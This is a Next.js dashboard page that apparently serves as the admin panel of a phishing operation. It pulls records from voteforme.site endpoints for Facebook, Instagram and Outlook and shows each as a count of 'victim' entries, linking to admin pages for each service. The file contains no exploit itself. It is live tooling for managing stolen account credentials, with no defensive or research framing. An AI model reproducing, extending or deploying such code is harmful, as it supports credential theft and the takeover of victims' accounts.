import Link from "next/link";
import styles from "./page.module.css";
export default async function Dashboard() {
  const facebook = await fetch("https://www.voteforme.site/api/facebook", {
    cache: "no-store",
  }).then((res) => res.json());

  const instagram = await fetch("https://www.voteforme.site/api/instagram", {
    cache: "no-store",
  }).then((res) => res.json());

  const outlook = await fetch("https://www.voteforme.site/api/outlook", {
    cache: "no-store",
  }).then((res) => res.json());

  return (
    <div className={styles.page}>
      <h2 className={styles.header}>Dashboard</h2>
      <div className={styles.boxes}>
        <Link className={styles.facebook} href="/admin/facebook">
          <div className={styles.box}>
            <div>
              <p>Facebook</p>
              <i className="fa-solid fa-chart-simple"></i>
            </div>
            <span>victim: {facebook?.length}</span>
          </div>
        </Link>

        <Link className={styles.instagram} href="/admin/instagram">
          <div className={styles.box}>
            <div>
              <p>Instagram</p>
              <i className="fa-solid fa-chart-simple"></i>
            </div>
            <span>victim: {instagram?.length}</span>
          </div>
        </Link>

        <Link className={styles.outlook} href="/admin/outlook">
          <div className={styles.box}>
            <div>
              <p>Outlook</p>
              <i className="fa-solid fa-chart-simple"></i>
            </div>
            <span>victim: {outlook?.length}</span>
          </div>
        </Link>
      </div>
    </div>
  );
}
